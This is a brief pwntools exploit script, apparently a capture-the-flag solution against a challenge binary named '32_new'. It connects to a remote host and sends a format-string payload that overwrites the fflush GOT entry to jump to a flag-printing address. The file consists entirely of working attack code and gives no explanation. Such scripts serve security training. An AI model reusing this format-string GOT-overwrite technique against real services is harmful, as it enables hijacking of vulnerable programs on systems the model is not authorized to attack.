# coding: utf-8
from pwn import *
#p = process('./32_new')
p = remote('163.172.176.29', 9035)
print p.recvline()
b = ELF('./32_new')
where = b.got['fflush']
what = 0x0804870b #print flag
off = 10
num_written = len('Ok cool, soon we will know whether you pwned it or not. Till then Bye ')
payload = fmtstr_payload(off, {where:what}, numbwritten=num_written)
p.sendline(payload)
p.interactive()
